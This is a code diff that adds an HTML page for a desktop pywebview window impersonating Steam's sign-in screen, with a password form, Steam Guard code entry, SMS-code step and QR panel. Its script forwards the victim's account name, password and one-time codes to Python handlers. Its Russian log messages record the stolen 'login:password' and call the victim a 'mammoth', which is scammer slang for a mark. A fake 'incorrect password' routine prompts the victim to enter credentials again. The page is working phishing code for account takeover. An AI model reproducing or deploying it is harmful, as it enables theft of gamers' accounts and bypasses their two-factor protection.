@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html class="Rp8QOGJ2DypeDniMnRBhr" lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <style>
+        :root {
+            --GradientColor1: #81399a;
+            --GradientColor2: #0094a2;
+            --virtualmenu-accent: #1a9fff;
+            --virtualmenu-bg: #1f1f1f;
+            --touchmenuicon-fg: #b8bcbf;
+        }
+
+        body {
+            background-color: #181a21;
+            color: #afafaf;
+            font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            user-select: none;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .login-container {
+            background: #181a21;
+            width: 710px;
+            height: 470px;
+            padding: 40px;
+            box-sizing: border-box;
+            position: relative;
+            display: flex;
+            flex-direction: row;
+        }
+
+        /* TitleBar */
+        .TitleBar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 40px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding-right: 15px;
+            z-index: 1000;
+        }
+
+        .close-btn {
+            color: #b8b6b4;
+            cursor: pointer;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s, color 0.2s;
+            border-radius: 2px;
+        }
+
+        .close-btn:hover {
+            background-color: #c42b1c;
+            color: white;
+        }
+
+        .close-btn svg {
+            width: 14px;
+            height: 14px;
+            stroke: currentColor;
+            stroke-width: 40;
+            fill: none;
+        }
+
+        /* Left Side */
+        .form-section {
+            flex: 1;
+            padding-right: 40px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-section {
+            margin-bottom: 25px;
+        }
+
+        .title {
+            color: #1999ff;
+            font-size: 12px;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+            font-family: Arial;
+        }
+
+        .title-grey {
+            color: #afafaf;
+            font-size: 12px;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+            font-family: Arial;
+        }
+
+        /* ... intervening code ... */
+
+        .create-account {
+            position: absolute;
+            bottom: 52px;
+            right: 40px;
+            color: #afafaf;
+            font-size: 12px;
+        }
+
+        input {
+            background-color: #32353c;
+            border: 1px solid #14151a;
+            border-radius: 2px;
+            color: #e1e1e1;
+            padding-left: 10px;
+            width: 100%;
+            height: 40px;
+            font-size: 15px;
+            margin-bottom: 15px;
+            outline: none;
+            box-sizing: border-box;
+            font-family: Arial;
+        }
+
+        input:focus {
+            background-color: #393c44;
+            border-color: #66c0f4;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #afafaf;
+            margin-bottom: 25px;
+            cursor: pointer;
+        }
+
+        .checkbox-box {
+            width: 18px;
+            height: 18px;
+            background: #32353c;
+            border-radius: 2px;
+            margin-right: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .checkbox-box.checked {
+            background: #32353c;
+        }
+
+        /* Should be dark, checkmark is white */
+        .checkbox-box svg {
+            width: 14px;
+            height: 14px;
+            stroke: white;
+            display: none;
+            fill: none;
+            stroke-width: 5;
+        }
+
+        .checkbox-box.checked svg {
+            display: block;
+        }
+
+        .btn-login {
+            background: #1a9fff;
+            background: linear-gradient(90deg, #06bfff 0%, #2d73ff 100%);
+            border: none;
+            color: white;
+            width: 100%;
+            height: 48px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 2px;
+            margin-top: 10px;
+            font-family: Arial;
+        }
+
+        .btn-login:hover {
+            filter: brightness(1.1);
+        }
+
+        /* Right Side - QR */
+        .qr-section {
+            width: 240px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 70px;
+        }
+
+        .qr-frame {
+            background: white;
+            width: 220px;
+            height: 220px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            padding: 10px;
+            box-sizing: border-box;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .qr-frame img {
+            width: 100%;
+            height: 100%;
+            image-rendering: pixelated;
+            display: block;
+        }
+
+        .qr-footer {
+            font-size: 14px;
+            color: #b8b6b4;
+            text-align: center;
+            line-height: 1.4;
+            width: 170px;
+        }
+
+        .blue-link {
+            color: #66c0f4;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .blue-link:hover {
+            text-decoration: underline;
+        }
+
+        .help-link {
+            color: #afafaf;
+            font-size: 12px;
+            text-decoration: underline;
+            margin-top: 30px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .help-link:hover {
+            color: white;
+        }
+
+        .create-account {
+            position: absolute;
+            bottom: 42px;
+            right: 40px;
+            color: #afafaf;
+            font-size: 12px;
+        }
+
+        /* Hide browser password reveal icons */
+        input::-ms-reveal,
+        input::-ms-clear {
+            display: none !important;
+        }
+
+        /* Mobile Frame Styling */
+        .mobile-mockup {
+            width: 280px;
+            background: #1b1c21;
+            border: 8px solid #33363d;
+            border-radius: 36px;
+            padding: 20px 15px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+
+        .mobile-mockup::before {
+            content: "";
+            width: 60px;
+            height: 4px;
+            background: #33363d;
+            border-radius: 2px;
+            position: absolute;
+            top: 10px;
+        }
+
+        .mobile-header {
+            width: 100%;
+            height: 180px;
+            background: #25282e;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            background-image: url('https://community.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: 50%;
+        }
+
+        .mobile-content {
+            text-align: center;
+            width: 100%;
+        }
+
+        .mobile-title {
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .mobile-info {
+            font-size: 12px;
+            color: #8f9196;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .mobile-buttons {
+            display: flex;
+            width: 100%;
+            gap: 10px;
+        }
+
+        .btn-mobile {
+            flex: 1;
+            height: 40px;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .btn-approve {
+            background: #1a9fff;
+            color: white;
+        }
+
+        .btn-deny {
+            background: #3d4450;
+            color: #afafaf;
+        }
+
+        .switch-link {
+            display: block;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #66c0f4;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="TitleBar">
+        <div class="close-btn"
+            onclick="if(window.pywebview) window.pywebview.api.log_event('Пользователь закрыл окно Steam (Крестик)'); setTimeout(()=>window.pywebview.api.close(), 100);">
+            <svg viewBox="0 0 256 256" stroke="currentColor" stroke-width="40" fill="none">
+                <line x1="212" y1="212" x2="44" y2="44"></line>
+                <line x1="44" y1="212" x2="212" y2="44"></line>
+            </svg>
+        </div>
+    </div>
+
+    <div class="login-container">
+        <!-- LOGIN FORM -->
+        <div class="form-section" id="login_step">
+            <div class="logo-section">
+                <img src="https://community.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg"
+                    width="176">
+            </div>
+
+            <div class="title">Sign in with account name</div>
+            <input type="text" id="username" class="_2GBWeup5cttgbTw8FM3tfx" spellcheck="false">
+
+            <div class="title-grey">Password</div>
+            <input type="password" id="password" class="_2GBWeup5cttgbTw8FM3tfx">
+
+            <div class="checkbox-container" onclick="this.querySelector('.checkbox-box').classList.toggle('checked')">
+                <div class="checkbox-box">
+                    <svg viewBox="0 0 256 256" fill="none" stroke="white" stroke-width="35" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <polyline points="49.5,147.75 95,210.75 206.5,45.25"></polyline>
+                    </svg>
+                </div>
+                Remember me
+            </div>
+
+            <button class="btn-login" onclick="sendData()">Sign in</button>
+            <a class="help-link">Help, I can't sign in</a>
+        </div>
+
+        <!-- 2FA FORM (Redesigned to match original) -->
+        <div class="form-section" id="2fa_step" style="display: none; align-items: center; padding-right: 0;">
+            <div class="logo-section"
+                style="margin-bottom: 25px; width: 100%; display: flex; justify-content: flex-start;">
+                <img src="https://community.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg"
+                    width="176">
+            </div>
+
+            <div class="account-name" style="color: #afafaf; font-family: Arial; font-size: 18px; margin-bottom: 25px;">
+                Account: <span id="account_label" style="color: white; font-weight: bold;"></span></div>
+
+            <div class="confirm-box"
+                style="background-color: #21242d; border-radius: 4px; padding: 32px 40px; display: flex; flex-direction: column; align-items: center; margin-bottom: 30px; width: 440px; position: relative; box-sizing: border-box;">
+
+                <!-- OTP Inputs Row (top, full width) -->
+                <div
+                    style="background-color: #1a1c23; border-radius: 4px; padding: 24px 30px; display: flex; justify-content: center; align-items: center; width: 100%; box-sizing: border-box; box-shadow: inset 0 0 4px rgba(0,0,0,0.3); margin-bottom: 18px;">
+                    <div style="display: flex; gap: 12px;" id="otp_inputs">
+                        <input maxlength="1" class="otp-line" type="text" autocomplete="off">
+                        <input maxlength="1" class="otp-line" type="text" autocomplete="off">
+                        <input maxlength="1" class="otp-line" type="text" autocomplete="off">
+                        <input maxlength="1" class="otp-line" type="text" autocomplete="off">
+                        <input maxlength="1" class="otp-line" type="text" autocomplete="off">
+                    </div>
+                </div>
+
+                <!-- Bottom row: text + phone icon side by side -->
+                <div style="display: flex; align-items: center; justify-content: center; width: 100%; gap: 14px;">
+                    <div
+                        style="color: white; font-size: 16px; font-weight: bold; font-family: 'Motiva Sans', Sans-serif;">
+                        Enter the code from your Steam Mobile App
+                    </div>
+                    <!-- Phone Icon next to text -->
+                    <div
+                        style="color: #1a9fff; position: relative; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+                        <svg viewBox="0 0 33 49" fill="currentColor" style="width: 36px; height: 44px;">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                d="M28 47.1106C29.1046 47.1106 30 46.2151 30 45.1106L30 3.72705C30 2.62248 29.1046 1.72705 28 1.72705L5 1.72705C3.89544 1.72705 3 2.62248 3 3.72705L3 45.1106C3 46.2151 3.89543 47.1106 5 47.1106L28 47.1106ZM5.68119 5.82741L27.3188 5.82741L27.3188 42.7772H5.68119L5.68119 5.82741ZM20.9999 44.944C20.9999 45.3429 20.6766 45.6662 20.2777 45.6662L12.7221 45.6662C12.3233 45.6662 11.9999 45.3429 11.9999 44.944C11.9999 44.5451 12.3233 44.2218 12.7221 44.2218H20.2777C20.6766 44.2218 20.9999 44.5451 20.9999 44.944ZM17.2778 4.44406C17.6767 4.44406 18 4.12071 18 3.72184C18 3.32296 17.6767 2.99962 17.2778 2.99962L15.7222 2.99962C15.3233 2.99962 15 3.32296 15 3.72184C15 4.12071 15.3233 4.44406 15.7222 4.44406L17.2778 4.44406Z">
+                            </path>
+                        </svg>
+                        <div
+                            style="position: absolute; top: 14px; left: 50%; transform: translateX(-50%); color: #1a9fff; font-size: 10px; letter-spacing: 1px; font-weight: bold;">
+                            •••••</div>
+                    </div>
+                </div>
+            </div>
+
+            <style>
+                .otp-line {
+                    width: 45px !important;
+                    height: 40px !important;
+                    font-size: 28px !important;
+                    text-align: center !important;
+                    text-transform: uppercase;
+                    margin: 0 !important;
+                    padding: 0 !important;
+                    background-color: transparent !important;
+                    border: none !important;
+                    border-bottom: 2px solid #3d4450 !important;
+                    border-radius: 0 !important;
+                    color: #fff;
+                    font-family: 'Motiva Sans', Sans-serif;
+                }
+
+                .otp-line:focus {
+                    border-bottom-color: #66c0f4 !important;
+                    outline: none !important;
+                }
+            </style>
+
+            <div class="links" style="display: flex; flex-direction: column; gap: 12px; text-align: center;">
+                <a class="link"
+                    style="color: #afb1b8; text-decoration: underline; font-size: 13px; cursor: pointer;">Use backup
+                    code</a>
+                <a class="link"
+                    style="color: #afb1b8; text-decoration: underline; font-size: 13px; cursor: pointer;">Help, I no
+                    longer have access to my Steam Mobile App</a>
+            </div>
+
+            <!-- Hidden button for logic compatibility -->
+            <button id="verify_btn_2fa" style="display: none;" onclick="submitOtp()"></button>
+        </div>
+
+        <!-- MOBILE APP CONFIRMATION - matching login/image.png -->
+        <div class="form-section" id="confirm_step"
+            style="display: none; align-items: center; padding-right: 0; text-align: center;">
+            <div class="logo-section"
+                style="margin-bottom: 25px; width: 100%; display: flex; justify-content: flex-start;">
+                <img src="https://community.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg"
+                    width="176">
+            </div>
+
+            <div class="account-name" style="color: #afafaf; font-family: Arial; font-size: 18px; margin-bottom: 25px;">
+                Account: <span id="confirm_account_label" style="color: white; font-weight: bold;"></span>
+            </div>
+
+            <div class="confirm-box"
+                style="background-color: #21242d; border-radius: 4px; padding: 28px; display: flex; align-items: center; text-align: left; margin-bottom: 30px; width: 440px; box-sizing: border-box;">
+                <div
+                    style="width: 100px; height: 140px; border-radius: 4px; margin-right: 24px; overflow: hidden; background: #171a21; flex-shrink: 0; display: flex; align-items: center; justify-content: center;">
+                    <img src="image.png" style="width: 100%; height: 100%; object-fit: cover;">
+                </div>
+                <div style="color: white; font-size: 19px; line-height: 1.3; font-weight: bold; flex: 1;">
+                    Use the Steam Mobile App to confirm your sign in...
+                </div>
+            </div>
+
+            <div class="links" style="display: flex; flex-direction: column; gap: 12px; align-items: center;">
+                <a class="link" onclick="show2FA(document.getElementById('confirm_account_label').innerText)"
+                    style="color: #afb1b8; text-decoration: underline; font-size: 13px; cursor: pointer;">Enter a code
+                    instead</a>
+                <a class="link"
+                    style="color: #afb1b8; text-decoration: underline; font-size: 13px; cursor: pointer;">Help, I no
+                    longer have access to my Steam Mobile App</a>
+            </div>
+        </div>
+
+
+        <div class="qr-section" id="qr_step">
+            <div class="title"
+                style="width: 220px; text-align: left; margin-bottom: 8px; font-size: 12px; color: #1999ff; font-weight: bold; letter-spacing: 0.5px; text-transform: uppercase;">
+                OR SIGN IN WITH QR</div>
+            <div class="qr-frame">
+                <img id="qr_img" src="" style="display:none; image-rendering: pixelated; width: 100%; height: 100%;">
+            </div>
+            <div class="qr-footer" style="text-align: center; max-width: 200px; line-height: 1.4;">
+                Use the <span class="blue-link">Steam Mobile App</span> to sign in via QR Code
+            </div>
+        </div>
+
+        <div class="create-account" id="create_acc_step">
+            Don't have a Steam account? <span class="blue-link">Create a Free Account</span>
+        </div>
+    </div>
+
+    <script>
+        // Report when window is loaded
+        window.addEventListener('pywebviewready', function () {
+            window.pywebview.api.log_event("Окно Steam успешно отображено на экране мамонта.");
+        });
+
+        // Setup OTP Input Logic
+        document.addEventListener('DOMContentLoaded', () => {
+            const inputs = document.querySelectorAll('.otp-line, .otp-box');
+
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1) {
+                        if (index < inputs.length - 1) inputs[index + 1].focus();
+                    }
+
+                    // Auto-submit logic for lines
+                    if (input.classList.contains('otp-line')) {
+                        const allFilled = Array.from(inputs).filter(i => i.classList.contains('otp-line')).every(i => i.value.length === 1);
+                        if (allFilled) submitOtp();
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !e.target.value) {
+                        if (index > 0) inputs[index - 1].focus();
+                    }
+                });
+
+                // Paste support
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const text = (e.clipboardData || window.clipboardData).getData('text').trim();
+                    if (text.length === 5) {
+                        inputs.forEach((inp, i) => inp.value = text[i]);
+                        inputs[4].focus();
+                    }
+                });
+            });
+        });
+
+        function sendData() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+
+            if (u && p) {
+                if (window.pywebview) window.pywebview.api.log_event(`Ввёл лог:пасс (${u}:${p}) и нажал Войти`);
+
+                // Show loading state
+                document.querySelector('#login_step .btn-login').innerText = "Verifying...";
+                document.querySelector('#login_step .btn-login').disabled = true;
+
+                // Update label for next step
+                document.getElementById('account_label').innerText = u;
+
+                window.pywebview.api.collect(u, p);
+            } else {
+                if (window.pywebview) window.pywebview.api.log_event("Пытался войти с пустыми полями");
+            }
+        }
+
+        // Called by Python to show 2FA input
+        function show2FA(accountName) {
+            document.getElementById('login_step').style.display = 'none';
+            document.getElementById('qr_step').style.display = 'none';
+            document.getElementById('create_acc_step').style.display = 'none';
+            document.getElementById('confirm_step').style.display = 'none';
+            if (document.getElementById('sms_step')) document.getElementById('sms_step').style.display = 'none';
+
+            const step2 = document.getElementById('2fa_step');
+            step2.style.display = 'flex';
+            step2.style.flexDirection = 'column';
+
+            // Set dynamic account name
+            if (accountName) {
+                document.getElementById('account_label').innerText = accountName;
+            }
+
+            // Reset button
+            const loginBtn = document.querySelector('#login_step .btn-login');
+            if (loginBtn) {
+                loginBtn.innerText = "Sign in";
+                loginBtn.disabled = false;
+            }
+        }
+
+        // Called by Python to show Mobile App Confirmation
+        function showConfirmApp(accountName) {
+            document.getElementById('login_step').style.display = 'none';
+            document.getElementById('qr_step').style.display = 'none';
+            document.getElementById('create_acc_step').style.display = 'none';
+            document.getElementById('2fa_step').style.display = 'none';
+            if (document.getElementById('sms_step')) document.getElementById('sms_step').style.display = 'none';
+
+            const confirmStep = document.getElementById('confirm_step');
+            confirmStep.style.display = 'flex';
+            confirmStep.style.flexDirection = 'column';
+
+            // Set dynamic account name
+            if (accountName) {
+                document.getElementById('confirm_account_label').innerText = accountName;
+            } else {
+                document.getElementById('confirm_account_label').innerText = document.getElementById('username').value;
+            }
+        }
+
+        function submitOtp() {
+            try {
+                const inputs = document.querySelectorAll('.otp-line');
+                let code = "";
+                inputs.forEach(i => code += i.value);
+                code = code.trim().toUpperCase();
+
+                if (code.length === 5) {
+                    if (window.pywebview) window.pywebview.api.log_event(`Ввёл код Guard: ${code}`);
+
+                    // Update button status
+                    const inputs_container = document.getElementById('otp_inputs');
+                    if (inputs_container) {
+                        inputs_container.style.opacity = "0.5";
+                        inputs_container.style.pointerEvents = "none";
+                    }
+                    window.pywebview.api.submit_2fa(code);
+                } else {
+                    if (window.pywebview) window.pywebview.api.log_event("Пользователь ввёл короткий код Guard");
+                }
+            } catch (e) {
+                if (window.pywebview) window.pywebview.api.log_event("JS Error: " + e);
+            }
+        }
+
+        function showError(msg) {
+            // Log to python instead of alert
+            if (window.pywebview) window.pywebview.api.log_event("Steam Alert (UI): " + msg);
+
+            // Re-enable 2FA button
+            const btn2fa = document.querySelector('#2fa_step .btn-login');
+            if (btn2fa) {
+                btn2fa.innerText = "Verify";
+                btn2fa.disabled = false;
+            }
+
+            // Re-enable SMS button
+            const smsStep = document.getElementById('sms_step');
+            if (smsStep) {
+                const btnSms = smsStep.querySelector('.btn-login');
+                if (btnSms) {
+                    btnSms.innerText = "Submit Code";
+                    btnSms.disabled = false;
+                }
+            }
+
+            // Clear inputs
+            const inputs = document.querySelectorAll('.otp-box');
+            inputs.forEach(i => i.value = '');
+            if (inputs.length > 0) inputs[0].focus();
+        }
+
+        function showInputError() {
+            // Reset button
+            const btn = document.querySelector('#login_step .btn-login');
+            if (btn) {
+                btn.innerText = "Sign in";
+                btn.disabled = false;
+            }
+
+            // Status message
+            let statusMsg = document.getElementById('login_status_msg');
+            const helpLink = document.querySelector('.help-link');
+            const loginStep = document.getElementById('login_step');
+
+            if (!statusMsg) {
+                statusMsg = document.createElement('div');
+                statusMsg.id = 'login_status_msg';
+                statusMsg.style.color = '#c42b1c';
+                statusMsg.style.fontSize = '12px';
+                statusMsg.style.marginTop = '10px';
+                statusMsg.style.marginBottom = '10px';
+                statusMsg.style.textAlign = 'center';
+                loginStep.insertBefore(statusMsg, helpLink);
+            }
+            statusMsg.innerText = "The account name or password that you have entered is incorrect.";
+
+            // Add red borders
+            const u = document.getElementById('username');
+            const p = document.getElementById('password');
+            if (u) {
+                u.classList.add('input-error');
+                u.oninput = function () { this.classList.remove('input-error'); u.classList.remove('input-error'); statusMsg.innerText = ""; };
+            }
+            if (p) {
+                p.classList.add('input-error');
+                p.value = "";
+                p.focus();
+                p.oninput = function () { this.classList.remove('input-error'); p.classList.remove('input-error'); statusMsg.innerText = ""; };
+            }
+        }
+
+        // --- NEW: SMS Flow for Real Authenticator ---
+        function showSMSInput(accountName) {
+            // Hide previous steps
+            document.getElementById('login_step').style.display = 'none';
+            document.getElementById('2fa_step').style.display = 'none';
+            document.getElementById('qr_step').style.display = 'none';
+            document.getElementById('confirm_step').style.display = 'none';
+
+            // Create SMS step if not exists, or reuse
+            let smsStep = document.getElementById('sms_step');
+            if (!smsStep) {
+                const container = document.querySelector('.login-container');
+                smsStep = document.createElement('div');
+                smsStep.id = 'sms_step';
+                smsStep.className = 'form-section';
+                smsStep.style.display = 'flex';
+                smsStep.style.flexDirection = 'column';
+                smsStep.style.alignItems = 'center';
+                smsStep.style.textAlign = 'center';
+                smsStep.innerHTML = `
+                    <div class="logo-section" style="margin-bottom: 20px;">
+                        <img src="https://community.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg" width="140">
+                    </div>
+                    <div class="account-name" style="color: #afafaf; font-family: Arial; font-size: 14px; margin-bottom: 20px;">
+                        Account: <span style="color: white; font-weight: bold;">${accountName || ''}</span>
+                    </div>
+                    <div class="title" style="margin-bottom: 10px;">ENTER SMS CODE</div>
+                    <p style="font-size: 14px; color: #afafaf; margin-bottom: 20px;">A code was sent to your phone number.</p>
+                    <input type="text" id="sms_code_input" class="_2GBWeup5cttgbTw8FM3tfx" placeholder="G-XXXXX" style="text-transform: uppercase;">
+                    <button class="btn-login" onclick="sendSMS()">Submit Code</button>
+                `;
+                container.insertBefore(smsStep, document.querySelector('.qr-section'));
+            } else {
+                smsStep.style.display = 'flex';
+            }
+        }
+
+        function sendSMS() {
+            const code = document.getElementById('sms_code_input').value;
+            if (code.length < 2) {
+                // No alert, just log or do nothing. Most inputs have min length check.
+                return;
+            }
+            document.querySelector('#sms_step .btn-login').innerText = "Verifying...";
+            document.querySelector('#sms_step .btn-login').disabled = true;
+            window.pywebview.api.collect_sms(code);
+        }
+
+        function updateQR(base64_img) {
+            const img = document.getElementById('qr_img');
+            if (img) {
+                img.src = "data:image/png;base64," + base64_img;
+                img.style.display = 'block';
+                // Hide loader if present
+                const loader = document.querySelector('.qr-loading');
+                if (loader) loader.style.display = 'none';
+            }
+        }
+    </script>
+    <style>
+        .input-error {
+            border: 1px solid #c42b1c !important;
+            transition: border 0.2s;
+        }
+    </style>
+</body>
+
+</html>
